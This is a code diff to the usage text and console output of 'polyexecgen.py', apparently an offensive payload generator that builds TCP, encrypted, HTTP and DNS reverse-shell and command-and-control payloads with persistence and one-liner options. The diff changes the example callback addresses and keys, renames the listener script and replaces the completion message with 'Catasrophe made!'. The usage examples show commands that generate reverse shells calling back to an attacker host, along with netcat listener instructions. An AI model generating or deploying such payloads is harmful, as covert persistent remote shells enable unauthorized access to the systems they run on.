@@ -458,26 +458,26 @@ C2 Modes:
   tcp           Basic TCP reverse shell (simple, fast)
   encrypted     AES-256 encrypted TCP shell (recommended)
   http          HTTP/HTTPS C2 (blends with web traffic)
-  dns           DNS-based C2 (most covert)
+  dns           DNS-based C2 (covert)
 
 Examples:
   # Basic TCP shell
-  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m tcp
+  ./polyexecgen.py -t 192.168.1.5 -p 4444 -m tcp
   
   # Encrypted shell (recommended)
-  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted -k MySecretKey
+  ./polyexecgen.py -t 192.168.1.5 -p 4444 -m encrypted -k crazyg00dpassw0rd
   
   # HTTP C2
-  ./polyexecgen.py -t http://192.168.1.100:8080/shell -m http -k MyKey
+  ./polyexecgen.py -t http://192.168.1.100:5/shell -m http -k crazyg00dpassw0rd
   
   # DNS C2
   ./polyexecgen.py -m dns --dns-domain c2.example.com
   
   # Generate 5 variants with persistence
-  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m encrypted -c 5 --persist
+  ./polyexecgen.py -t 192.168.1.5 -p 4444 -m encrypted -c 5 --persist
   
   # Generate one-liner
-  ./polyexecgen.py -t 192.168.1.100 -p 4444 -m tcp --oneliner
+  ./polyexecgen.py -t 192.168.1.5 -p 4444 -m tcp --oneliner
         """
     )
     
@@ -542,7 +542,7 @@ Examples:
             print(f"[+] Saved to: {filepath}")
             print(f"    Size: {len(payload)} bytes")
     
-    print(f"\n[*] Generation complete!")
+    print(f"\n[*] Catasrophe made!")
     
     if not args.oneliner:
         print(f"    Files saved to: {args.output}/")
@@ -553,7 +553,7 @@ Examples:
     if args.mode == 'tcp':
         print(f"    nc -lvnp {args.port}")
     elif args.mode == 'encrypted':
-        print(f"    python3 c2_listener.py")
+        print(f"    python3 c2_catcher.py")
         print(f"    Select [1] Encrypted, Key: {args.key or 'MySecretKey123'}")
     elif args.mode == 'http':
         print(f"    Set up Flask/Express server at {args.target}")
